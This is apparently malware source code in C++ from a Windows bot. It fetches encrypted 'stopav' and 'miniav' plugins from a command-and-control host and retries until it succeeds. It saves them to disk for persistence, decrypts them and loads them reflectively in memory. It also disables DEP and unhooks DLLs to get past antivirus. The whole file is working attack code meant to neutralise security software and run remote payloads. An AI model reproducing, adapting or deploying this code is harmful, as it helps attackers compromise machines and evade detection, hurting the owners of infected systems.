#include <windows.h>

#include "GetApi.h"
#include "Loader.h"
#include "DllLoader.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "Config.h"
#include "Crypt.h"
#include "Utils.h"
#include "Inject.h"
#include "Unhook.h"



DWORD WINAPI AvBlockThread( LPVOID lpData )
{
	if ( (DWORD)pGetFileAttributesW( GetStopAVPath() ) != INVALID_FILE_ATTRIBUTES )
	{
		return 0;
	}

	char *Host = GetCurrentHost();

	if ( Host == NULL )
	{
		return 0;
	}

	char AvBlockFile[] = {'/','c','f','g','/','s','t','o','p','a','v','.','p','l','u','g',0};

	char AvBlockUrl[256];

	m_lstrcpy( AvBlockUrl, Host );
	m_lstrcat( AvBlockUrl, AvBlockFile );


	LPBYTE BotModule   = NULL;
	DWORD dwModuleSize = 0;

	while ( !DownloadInMem( AvBlockUrl, &BotModule, &dwModuleSize ) ) 
	{
		pSleep( 1000 * 60 * 5 );
	}

	if ( BotModule != NULL && dwModuleSize )
	{
		LPVOID FileData = MemAlloc( dwModuleSize + 1 );
		
		if ( FileData )
		{
			m_memcpy( FileData, BotModule, dwModuleSize );
			File::WriteBufferW(GetMiniAVPath(), FileData, dwModuleSize );
			MemFree( FileData );
		}

		LPVOID Module = DecryptPlugin( BotModule, dwModuleSize );	

		if ( Module )
		{
			HMEMORYMODULE hLib = MemoryLoadLibrary( Module );

			if ( hLib == NULL )
			{
				return 0;
			}

			MemoryFreeLibrary( hLib );
		}
	}

	return 0;
}


DWORD WINAPI MiniAVThread( LPVOID lpData )
{
	if ( (DWORD)pGetFileAttributesW( GetMiniAVPath() ) != (DWORD)-1 )
	{
		return 0;
	}

	char *Host = GetCurrentHost();

	if ( Host == NULL )
	{
		return 0;
	}

	char MiniAVFile[] = {'/','c','f','g','/','m','i','n','i','a','v','.','p','l','u','g',0};

	char MiniAVUrl[256];

	m_lstrcpy( MiniAVUrl, Host );
	m_lstrcat( MiniAVUrl, MiniAVFile );

	LPBYTE BotModule   = NULL;
	DWORD dwModuleSize = 0;

	while ( !DownloadInMem( MiniAVUrl, &BotModule, &dwModuleSize ) ) 
	{
		pSleep( 1000 * 60 * 5 );
	}
	

	if ( BotModule != NULL && dwModuleSize )
	{
		LPVOID FileData = MemAlloc( dwModuleSize + 1 );
		
		if ( FileData )
		{
			m_memcpy( FileData, BotModule, dwModuleSize );
			File::WriteBufferW( GetStopAVPath(), FileData, dwModuleSize );
			MemFree( FileData );
		}

		LPVOID Module = DecryptPlugin( BotModule, dwModuleSize );

		if ( Module )
		{
			HMEMORYMODULE hLib = MemoryLoadLibrary( Module );
			MemoryFreeLibrary( hLib );
			MemFree( Module	   );
		}

	}

	return 0;
}


DWORD WINAPI AvFuckThread( LPVOID lpData )
{
	DisableDEP();
	UnhookDlls();

	HANDLE hBlockAV = StartThread( AvBlockThread, NULL );
	HANDLE hMiniAV  = StartThread( MiniAVThread, NULL );
	
	pWaitForSingleObject( hBlockAV, INFINITE );
	pWaitForSingleObject( hMiniAV, INFINITE  );
	
	pExitProcess( 1 );

	return 0;
}

void InitAV()
{
	DisableDEP();

	DWORD dwMiniSize = 0;
	DWORD dwStopSize = 0;

	LPBYTE pMiniAV = GetFileData( GetMiniAVPath(), &dwMiniSize );
	LPBYTE pStopAV = GetFileData( GetStopAVPath(), &dwStopSize );

	if ( pMiniAV && dwMiniSize )
	{
		LPVOID MiniAVDll = DecryptPlugin( pMiniAV, dwMiniSize );

		HMEMORYMODULE hLib = MemoryLoadLibrary( MiniAVDll );

		if ( hLib )
		{
			MemoryFreeLibrary( hLib );
		}

		MemFree( MiniAVDll );
	}

	if ( pStopAV && dwStopSize )
	{
		LPVOID StopAVDll = DecryptPlugin( pStopAV, dwStopSize );

		HMEMORYMODULE hLib = MemoryLoadLibrary( StopAVDll );

		if ( hLib )
		{
			MemoryFreeLibrary( hLib );
		}
		

		MemFree( StopAVDll );
	}

	if (  !dwStopSize || !dwMiniSize )
	{
		MegaJump( AvFuckThread );
	}

	return;
}

